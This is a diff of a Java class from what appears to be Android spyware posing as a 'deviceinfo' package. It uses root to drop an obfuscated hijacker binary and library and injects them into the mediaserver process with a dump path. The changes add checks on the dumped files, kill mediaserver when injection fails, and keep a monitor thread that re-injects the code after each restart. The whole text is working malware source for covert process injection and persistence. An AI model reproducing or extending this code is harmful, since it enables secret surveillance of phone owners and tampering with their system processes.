@@ -11,6 +11,7 @@ import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.file.Directory;
 import com.android.m.M;
 
 public class Instrument {
@@ -42,10 +43,10 @@ public class Instrument {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(installHijacker): Nope, we are not root");
 				}
-				
+
 				return false;
 			}
-			
+
 			// Install library
 			Root.fileWrite(lib, stream, Cfg.RNDDB);
 			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + path + "/" + lib);
@@ -60,8 +61,7 @@ public class Instrument {
 			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
-			Runtime.getRuntime()
-					.exec(Configuration.shellFile + " " + M.e("pzm 750") + " " + path + "/" + hijacker);
+			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750") + " " + path + "/" + hijacker);
 
 			stream.close();
 		} catch (Exception e) {
@@ -83,23 +83,55 @@ public class Instrument {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
 			}
-			
+
 			return;
 		}
-		
+
 		int pid = getProcessPid();
 
 		if (pid > 0) {
 			// Run the injector
 			String scriptName = "ij";
 			String script = M.e("#!/system/bin/sh") + "\n";
+			if(Cfg.DEBUG){
+				script += "touch /data/local/tmp/log; chmod 666 /data/local/tmp/log; \n";
+			}
+			// script += "kill " + pid + "\n";
+			// script += "sleep 10 \n";
 			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
 
 			Root.createScript(scriptName, script);
 			Execute.executeRoot(path + "/" + scriptName);
-			
+
 			Root.removeScript(scriptName);
 
+			Utils.sleep(2);
+			int newpid = getProcessPid();
+			if (newpid != pid) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+				}
+			}
+			
+			File d = new File(dumpPath);
+			File[] files = d.listFiles();
+			boolean started = false;
+			for (File file : files) {
+				if(file.getName().endsWith(M.e(".cnf"))){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+					}
+					started = true;
+					file.delete();
+				}
+			}
+
+			if(!started){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation) Kill mediaserver");
+				}
+				killProc();
+			}
 			stopMonitor = false;
 
 			if (pidMonitor == null) {
@@ -107,7 +139,7 @@ public class Instrument {
 					Check.log(TAG + " (startInstrumentation) script: \n" + script);
 					Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
 				}
-				
+
 				pidMonitor = new MediaserverMonitor(pid);
 				monitor = new Thread(pidMonitor);
 				monitor.start();
@@ -169,27 +201,38 @@ public class Instrument {
 		public void run() {
 			while (true) {
 				Utils.sleep(10000);
-	
+
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
 					}
-	
+
 					stopMonitor = false;
 					return;
 				}
-	
+
 				cur_pid = getProcessPid();
-	
+
 				// Mediaserver died
 				if (cur_pid != start_pid) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
 					}
-	
+
 					startInstrumentation();
 					start_pid = getProcessPid();
 				}
+			}
+		}
+	}
+
+	public void killProc() {
+		try {
+			int pid = getProcessPid();
+			android.os.Process.killProcess(pid);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (killProc) Error: " + ex);
 			}
 		}
 	}
